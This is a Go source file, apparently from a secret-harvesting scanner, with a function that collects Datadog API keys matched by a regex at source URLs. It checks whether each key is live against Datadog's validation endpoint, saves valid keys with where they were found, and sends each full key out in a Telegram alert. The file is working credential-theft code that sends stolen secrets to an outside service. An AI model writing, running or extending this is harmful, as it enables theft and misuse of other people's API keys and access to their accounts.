package main

import (
	"context"
	"fmt"
	"net/http"
	"regexp"
	"time"
)

var datadogPattern = regexp.MustCompile(`(?i)(?:datadog|DD)[_-]?(?:api[_-]?)?key["'\s:=]+([a-f0-9]{32})`)

func (a *AWSScanner) CheckDatadog(key, sourceURL string) bool {
	if !a.Config.APIValidation.Datadog {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "datadog_found.txt")

	req, err := http.NewRequest("GET", "https://api.datadoghq.com/api/v1/validate", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Accept", "application/json")
	req.Header.Set("DD-API-KEY", key)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	req = req.WithContext(ctx)

	resp, err := do429Retry(client, req, 3)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return false
	}

	a.logValid("Datadog", fmt.Sprintf("Key: %s", key))
	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_datadog.txt")
	a.storeValidKeyLimit("Datadog", key, "")

	globalCounters.mu.Lock()
	globalCounters.APIsValidated++
	globalCounters.mu.Unlock()

	msg := a.tgHit("🐶", "DATADOG", sourceURL) + fmt.Sprintf(
		"Key : %s\n", key)
	go a.sendTelegram(msg)
	return true
}
